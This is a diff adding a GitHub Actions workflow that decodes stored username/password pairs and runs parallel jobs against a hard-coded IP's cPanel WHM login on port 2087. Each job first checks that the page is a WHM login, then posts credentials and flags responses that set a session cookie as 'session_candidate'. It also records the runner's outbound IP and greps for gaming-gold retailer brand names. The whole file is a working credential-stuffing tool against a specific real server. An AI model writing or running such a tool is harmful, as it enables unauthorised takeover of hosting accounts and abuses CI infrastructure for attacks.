@@ -1,0 +1,64 @@
+name: probe2087b
+on:
+  workflow_dispatch:
+    inputs:
+      idxs:
+        description: 'json array of pair indexes'
+        required: true
+      tag:
+        description: 'batch tag'
+        required: true
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        idx: ${{ fromJson(github.event.inputs.idxs) }}
+    env:
+      PAIRS_B64: ${{ secrets.PAIRS_B64 }}
+      IDX: ${{ matrix.idx }}
+      TAG: ${{ github.event.inputs.tag }}
+    steps:
+      - name: probe
+        run: |
+          set -u
+          python3 -c "import json,os,base64,hashlib;d=json.loads(base64.b64decode(os.environ['PAIRS_B64']));i=int(os.environ['IDX']);r=[x for x in d if int(x['i'])==i][0];open('u.txt','w').write(r['u']);open('p.txt','w').write(r['p']);open('pwsha.txt','w').write(hashlib.sha1(r['p'].encode()).hexdigest()[:16]);print('PWSHA '+hashlib.sha1(r['p'].encode()).hexdigest()[:16])"
+          U=$(cat u.txt); P=$(cat p.txt); PWS=$(cat pwsha.txt)
+          S=$(date +%s)
+          IP=$(curl -s --max-time 10 https://api.ipify.org 2>/dev/null || echo ERR)
+          CCODE=ERR; CLEN=0; CTITLE=""; CMARK=no; CRET=-1
+          curl -k -s -o canary.html -w '%{http_code}' --max-time 15 "https://170.249.218.92:2087/" > ccode.txt 2>/dev/null; CRET=$?
+          if [ $CRET -eq 0 ]; then CCODE=$(cat ccode.txt); fi
+          CLEN=$(wc -c < canary.html 2>/dev/null || echo 0); case "$CLEN" in ''|*[!0-9]*) CLEN=0;; esac
+          CTITLE=$(tr -d '\r\n' < canary.html 2>/dev/null | grep -o -i '<title>[^<]*' | head -1 | sed 's/<title>//I' | head -c 60)
+          if grep -qiE 'login_only|whostmgr|cpsrvd' canary.html 2>/dev/null; then CMARK=yes; fi
+          OK=no
+          if [ "$CCODE" = "200" ] && [ "$CLEN" -gt 40000 ] && echo "$CTITLE" | grep -qi 'WHM Login'; then OK=yes; fi
+          PCODE=SKIP; BODYLEN=0; PRET=-1; INV=no; CPSESS=no; BRAND=no; SIG=not_attempted
+          if [ "$OK" = "yes" ]; then
+            curl -k -s -D hdr.txt -o body.txt --max-time 20 -X POST "https://170.249.218.92:2087/login/?login_only=1" --data-urlencode "user=$U" --data-urlencode "pass=$P" >/dev/null 2>&1; PRET=$?
+            if [ -s hdr.txt ]; then PCODE=$(head -1 hdr.txt | tr -d '\r' | awk '{print $2}'); fi
+            BODYLEN=$(wc -c < body.txt 2>/dev/null || echo 0)
+            if grep -qi 'invalid_login' body.txt 2>/dev/null; then INV=yes; fi
+            if grep -qiE 'rsorder|rsgoldfast|p2pah|pso2ah|xxcase|wwmmoep|mmoexp|overpower3d|armorybids' body.txt hdr.txt canary.html 2>/dev/null; then BRAND=yes; fi
+            if grep -qi 'set-cookie:' hdr.txt 2>/dev/null; then
+              if grep -i 'set-cookie:' hdr.txt | grep -qi 'cpsession' && ! grep -i 'set-cookie:' hdr.txt | grep -qi '01-Jan-1970'; then CPSESS=yes; fi
+            fi
+            SIG=undecidable
+            if [ "$INV" = yes ]; then SIG=invalid_login; elif [ "$CPSESS" = yes ]; then SIG=session_candidate; elif [ "$PRET" != "0" ]; then SIG=undecidable; else SIG=http_other; fi
+          fi
+          E=$(( $(date +%s) - S ))
+          mkdir -p out
+          printf 'RESULTJSON {"i":%s,"tag":"%s","pw_sha1":"%s","ip":"%s","canary_code":"%s","canary_len":%s,"canary_title":"%s","canary_marker":"%s","canary_ret":%s,"canary_ok":"%s","post_code":"%s","post_len":%s,"post_ret":%s,"sig":"%s","brand":"%s","elapsed":%s}\n' "$IDX" "$TAG" "$PWS" "$IP" "$CCODE" "$CLEN" "$CTITLE" "$CMARK" "$CRET" "$OK" "$PCODE" "$BODYLEN" "$PRET" "$SIG" "$BRAND" "$E" | tee "out/job_$IDX.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: p2087b-${{ matrix.idx }}
+          path: out/
+          if-no-files-found: warn
